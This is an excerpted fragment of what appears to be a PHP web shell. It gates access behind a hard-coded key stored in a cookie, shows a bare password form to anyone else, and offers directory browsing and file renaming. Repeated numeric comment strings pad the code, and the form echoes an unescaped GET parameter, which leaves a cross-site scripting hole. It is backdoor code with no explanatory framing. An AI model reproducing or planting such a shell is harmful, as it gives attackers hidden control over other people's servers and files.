...
$auth_key = "054f1bebf88bd365a20654fbc1aeafc5";
...
$pass = false;
if (isset($_COOKIE['pw_name_99643'])) {
    if(($_COOKIE['pw_name_99643']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_99643'])) {
        if(($_POST['pw_name_99643']) == $auth_key) {
            setcookie("pw_name_99643", $_POST['pw_name_99643']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_99643' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774917382 1724682774829430 1724682774583016 1724682774675087
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774917382 1724682774829430 1724682774583016 1724682774675087
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774917382 1724682774829430 1724682774583016 1724682774675087
            $name = PATH . "/" . $_GET['r'];
